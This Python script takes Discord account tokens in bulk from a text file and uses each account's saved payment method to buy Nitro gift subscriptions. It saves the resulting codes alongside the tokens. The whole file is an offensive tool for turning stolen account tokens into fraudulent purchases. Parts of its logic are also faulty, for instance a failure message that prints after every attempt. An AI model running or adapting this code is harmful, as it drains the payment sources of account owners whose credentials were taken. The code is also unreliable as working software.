import requests
import platform
import os

from colorama import Fore, init


class NitroPurchaser: 
    def __init__(self):
        pass

    def client_headers(self, token):
        return {'Authorization': token}

    def save_code(self, token: str, code: str):
        with open('codes.txt', 'a+') as f:
            f.write(f'{token}:{code}\n')

    def get_plan_id(self, token: str):
        r = requests.get('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=self.client_headers(token)).json()
        try:
            return r[0]['plan_id']
        except:
            return None

    def get_payment_id(self, token: str):
        for json in requests.get('https://canary.discordapp.com/api/v6/users/@me/entitlements/gifts', headers=self.client_headers(token)).json():
            try:
                return json['id']
            except:
                return None
    
    def purchase(self):
        tokens = open('tokens.txt', 'r').read().split('\n')
        for token in tokens:

            sku = self.get_plan_id(token)
            payment_id = self.get_payment_id(token)
            print(f"\t{Fore.YELLOW}Attemping{Fore.RESET} => {token} {sku} - {payment_id} ")

            if sku is not None:
                r = requests.post('https://discord.com/api/v6/store/skus/521846918637420545/purchase', headers=self.client_headers(token), json={'expected_amount': 499, 'gift': True, 'payment_source_id': str(payment_id), 'sku_subscription_plan_id': '511651871736201216'})
                print(r.text)
                self.save_code(token, r.text)
            
            print(f"\t{Fore.RED}400{Fore.RESET} => {token} (Not able to purchase)")
        input("\n\tFinished...")

if __name__ == "__main__":
    client = NitroPurchaser()

    if platform.system() != 'Linux':
        init(convert=True)

    if os.path.exists('tokens.txt'):
        client.purchase()
    else:
        print(f"\t[{Fore.RED}FILE_NOT_FOUND{Fore.RESET}] => (tokens.txt)")
        input()
